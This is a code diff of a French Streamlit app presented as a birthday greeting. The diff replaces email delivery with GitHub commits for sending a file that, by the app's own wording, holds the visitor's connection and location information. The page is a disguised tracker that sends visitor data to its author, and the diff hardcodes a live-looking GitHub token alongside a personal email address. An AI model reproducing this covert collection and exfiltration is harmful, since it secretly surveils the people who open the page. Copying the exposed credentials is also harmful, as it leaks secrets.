@@ -1,11 +1,7 @@
 import streamlit as st
 import requests
 import datetime
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
+from github import Github, Auth
 
 # --- Configuration de la page ---
 st.set_page_config(page_title="Joyeux Anniversaire Ma Rose 🌹", page_icon="🌹", layout="centered")
@@ -35,47 +31,36 @@ st.markdown("""
     </style>
 """, unsafe_allow_html=True)
 
-# --- Fonction de génération du TXT et d'envoi par e-mail avec pièce jointe ---
-def generer_et_envoyer_txt(contenu_texte):
-    nom_fichier = "informations.txt"
+# --- Fonction pour envoyer/mettre à jour le fichier informations.txt sur GitHub ---
+def envoyer_sur_github(contenu_texte):
+    GITHUB_TOKEN = "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"
+    NOM_REPO = "B1ackeagle1e/Test"
+    NOM_FICHIER = "informations.txt"
     
-    # 1. Création physique du fichier texte localement sur le serveur Streamlit
-    with open(nom_fichier, "w", encoding="utf-8") as f:
-        f.write(contenu_texte)
-
-    # Paramètres de messagerie
-    expediteur = "anil.sarier6@gmail.com"
-    mot_de_passe_app = "VOTRE_MOT_DE_PASSE_APPLICATION_GMAIL"  # Remplacez par votre mot de passe d'application Gmail
-    destinataire = "anil.sarier6@gmail.com"
-
     try:
-        # Création du message e-mail
-        msg = MIMEMultipart()
-        msg['From'] = expediteur
-        msg['To'] = destinataire
-        msg['Subject'] = "🌹 Rapport d'anniversaire - Fichier informations.txt"
-
-        # Corps du message
-        corps = "Bonjour,\n\nVoici le fichier contenant les informations de connexion et de localisation de la visite.\n\nCordialement,"
-        msg.attach(MIMEText(corps, 'plain'))
-
-        # 2. Ajout du fichier 'informations.txt' en pièce jointe
-        with open(nom_fichier, "rb") as piece_jointe:
-            part = MIMEBase('application', 'octet-stream')
-            part.set_payload(piece_jointe.read())
-            encoders.encode_base64(part)
-            part.add_header('Content-Disposition', f"attachment; filename= {nom_fichier}")
-            msg.attach(part)
-
-        # 3. Connexion SMTP et envoi
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(expediteur, mot_de_passe_app)
-        server.sendmail(expediteur, destinataire, msg.as_string())
-        server.quit()
+        auth = Auth.Token(GITHUB_TOKEN)
+        g = Github(auth=auth)
+        repo = g.get_repo(NOM_REPO)
         
+        message_commit = f"Mise à jour des informations de connexion - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        
+        # Vérifier si le fichier existe déjà pour le mettre à jour ou le créer
+        try:
+            file_contents = repo.get_contents(NOM_FICHIER)
+            repo.update_file(
+                path=NOM_FICHIER,
+                message=message_commit,
+                content=contenu_texte,
+                sha=file_contents.sha
+            )
+        except:
+            repo.create_file(
+                path=NOM_FICHIER,
+                message=message_commit,
+                content=contenu_texte
+            )
     except Exception as e:
-        print(f"Erreur lors de l'envoi du mail : {e}")
+        print(f"Erreur GitHub : {e}")
 
 # --- Gestion des étapes avec la Session State ---
 if "etape" not in st.session_state:
@@ -144,8 +129,8 @@ elif st.session_state.etape == 3:
         except Exception as e:
             contenu_txt += f"Erreur lors de la récupération : {e}\n"
         
-        # Génération du fichier informations.txt et envoi par mail
-        generer_et_envoyer_txt(contenu_txt)
+        # Enregistrement et mise à jour automatique sur GitHub dans informations.txt
+        envoyer_sur_github(contenu_txt)
         
         st.session_state.etape = 4
         st.rerun()
